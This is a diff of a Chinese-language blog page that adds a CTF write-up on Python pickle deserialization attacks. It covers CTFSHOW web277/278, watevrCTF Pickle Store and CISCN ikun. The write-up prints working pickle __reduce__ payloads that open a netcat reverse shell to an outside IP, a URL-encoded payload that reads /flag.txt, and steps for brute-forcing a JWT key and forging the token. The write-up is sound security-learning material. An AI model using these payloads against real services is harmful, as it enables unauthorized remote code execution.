@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || RCE</title>
+    <title>Hoylindo || Python反序列化-wp</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -150,240 +150,157 @@
 
                 <div id="main">
                      
-<div class="categories-tags">
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Python反序列化-wp </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/2/12
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Python" style=color:#1bccbc>
+                    Python
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h3 id="CTFSHOW-web277"><a href="#CTFSHOW-web277" class="headerlink" title="CTFSHOW-web277"></a>CTFSHOW-web277</h3><ul>
+<li><p>源码找到<code>&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</code></p>
+</li>
+<li><p>传入一个data，base64解码后反序列化</p>
+</li>
+<li><p>没有回显，所以需要反弹shell：</p>
+<pre><code class="python">import base64
+import pickle
+
+
+class shell(object):
+    def __reduce__(self):
+        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 43.143.175.158 6666 -e /bin/sh&#39;)&quot;,))
+
+k = shell()
+print(base64.b64encode(pickle.dumps(k)))
+</code></pre>
+</li>
+</ul>
+<h3 id="CTFSHOW-web278"><a href="#CTFSHOW-web278" class="headerlink" title="CTFSHOW-web278"></a>CTFSHOW-web278</h3><ul>
+<li>提示过滤了<code>os.system</code>，换成<code>os.popen</code></li>
+<li>然后同上</li>
+</ul>
+<h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h3><ul>
+<li><p>打开是个什么商店的页面，随便买点东西抓个包，cookie很像base64，但是解出来是一团乱码</p>
+</li>
+<li><p>直接解码后反序列化：</p>
+<pre><code class="python">import pickle
+import base64
+
+enc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;
+
+print(pickle.loads(base64.b64decode(enc)))
+</code></pre>
+</li>
+<li><p>输出：<code>&#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&#125;</code></p>
+</li>
+<li><p>猜测后端肯定也有一个解码反序列化的过程，可以利用<code>__reduce__</code>执行命令</p>
+</li>
+<li><p>没有回显，考虑反弹shell：</p>
+<pre><code class="python">import base64
+import pickle
+
+
+class A(object):
+    def __reduce__(self):
+        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 43.143.175.158 6666 -e/bin/sh&#39;)&quot;,))
+
+
+a = A()
+print(base64.b64encode(pickle.dumps(a)))
+</code></pre>
+</li>
+</ul>
+<h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><ul>
+<li><p>页面提示一定要买到 lv6，看源码可以看到<code>lv5.png</code>，然后写脚本找 <code>lv6.png</code>：</p>
+<pre><code class="python">import requests
+
+for i in range(2, 200):
+    url = &#39;http://30cb3120-98f3-4cda-bfe4-8ae632607648.node4.buuoj.cn:81/shop?page=&#39;
+    url += str(i)
+    r = requests.get(url)
+    # print(r.url)
+    # print(r.text)
+    if &#39;lv6.png&#39; in r.text:
+        print(r.url)
+        exit(1)
+</code></pre>
+</li>
+<li><p>找到 lv6 在181页，访问，然后购买，抓包，折扣改的很小，返回这个页面：<code>/b1g_m4mber</code></p>
+</li>
+<li><p>显示只有admin可以访问，抓包看到cookie里有：<code>JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</code></p>
+</li>
+<li><p>拿去解码，可以看到包含一个<code>username</code>，爆破得到密钥：<code>1Kun</code></p>
+</li>
+<li><p>伪造jwt访问，源码里可以找到：</p>
+<pre><code class="html">&lt;a href=&quot;/static/asd1f654e683wq/www.zip&quot; &gt;&lt;span style=&quot;visibility:hidden&quot;&gt;删库跑路前我留了好东西在这里&lt;/span&gt;&lt;/a&gt;
+</code></pre>
+</li>
+<li><p>下载源码，在<code>admin.py</code>里找到一处反序列化：</p>
+<pre><code class="python">become = self.get_argument(&#39;become&#39;)
+p = pickle.loads(urllib.unquote(become))
+</code></pre>
+</li>
+<li><p>f12把hidden去掉，然后抓包传：<code>become=ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.</code>，拿到flag</p>
+</li>
+<li><p>exp：</p>
+<pre><code class="python">import commands
+import urllib
+import pickle
+class Try(object):
+    def __reduce__(self):
+        return (commands.getoutput, (&#39;cat /flag.txt&#39;,))
+
+
+a = Try()
+print(urllib.quote(pickle.dumps(a)))
+</code></pre>
+</li>
+</ul>
+
+    </div>
+
     
-    <div class="all-s">
-        
-        
-        <span>
-            <a href="/tags/CTF-WP/" style=background:#00bcd4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                CTF-WP
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/PHP/" style=background:#ff7d73>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                PHP
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/Python/" style=background:#1bccbc>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                Python
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/RCE/" style='background:linear-gradient(to right, #fbc2eb 0%, #bbd4ff 100%)'>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                RCE
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/信息泄露/" style=background:#ff7d73>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                信息泄露
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/lalalalala/" style=background:#00bcd4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                lalalalala
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/SQL注入/" style=background:#879cff>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                SQL注入
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/SSRF-CSRF/" style=background:#00bcd4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                SSRF&CSRF
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/SSRF/" style=background:#00bcd4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                SSRF
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/SSTI/" style=background:#ffa2c4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                SSTI
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/XXE/" style=background:#ffa2c4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                XXE
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/洛谷摸鱼日记/" style=background:#ff7d73>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                洛谷摸鱼日记
-            </a>
-        </span>
-        
-        
-        
-        <span>
-            <a href="/tags/文件上传/" style=background:#ffa2c4>
-                <span class="icon">
-                    <a-icon type="tag" theme="filled" />
-                </span>
-                文件上传
-            </a>
-        </span>
-        
-        
-    </div>
-    <div id="archives">
-        
-        <a-timeline>
-            <a-timeline-item color="#a5c2f5">
-                <a-card hoverable>
-                    <div class="item-time">2022/8/15</div>
-                    <a href="/2022/08/15/RCE/">
-                        <h3>基础漏洞之——RCE</h3>
-                    </a>
-                    <div class="info">
-                        
-                        <span class="category">
-                            <a href="/categories/关于web安全">
-                                <span class="icon">
-                                    <a-icon type="book" theme="filled" />
-                                </span>
-                                关于web安全
-                            </a>
-                        </span>
-                        
-
-                        
-                        <span class="tags">
-                            <span class="icon">
-                                <a-icon type="tags" theme="filled" />
-                            </span>
-                            
-                            <span class="tag">
-                                
-                                <a href="/tags/RCE" style=color:#ffa2c4>
-                                    RCE
-                                </a>
-                            </span>
-                            
-                        </span>
-                        
-                    </div>
-                </a-card>
-            </a-timeline-item>
-        </a-timeline>
-        
-        <a-timeline>
-            <a-timeline-item color="#a5c2f5">
-                <a-card hoverable>
-                    <div class="item-time">2022/8/15</div>
-                    <a href="/2022/08/15/RCE补充篇——无回显/">
-                        <h3>RCE补充篇——无回显</h3>
-                    </a>
-                    <div class="info">
-                        
-                        <span class="category">
-                            <a href="/categories/关于web安全">
-                                <span class="icon">
-                                    <a-icon type="book" theme="filled" />
-                                </span>
-                                关于web安全
-                            </a>
-                        </span>
-                        
-
-                        
-                        <span class="tags">
-                            <span class="icon">
-                                <a-icon type="tags" theme="filled" />
-                            </span>
-                            
-                            <span class="tag">
-                                
-                                <a href="/tags/RCE" style=color:#879cff>
-                                    RCE
-                                </a>
-                            </span>
-                            
-                        </span>
-                        
-                    </div>
-                </a-card>
-            </a-timeline-item>
-        </a-timeline>
-        
-    </div>
-    <script>
-        new Vue({
-            el: '#archives'
-        })
-    </script>
 </div>
                      
 <footer id="footer">
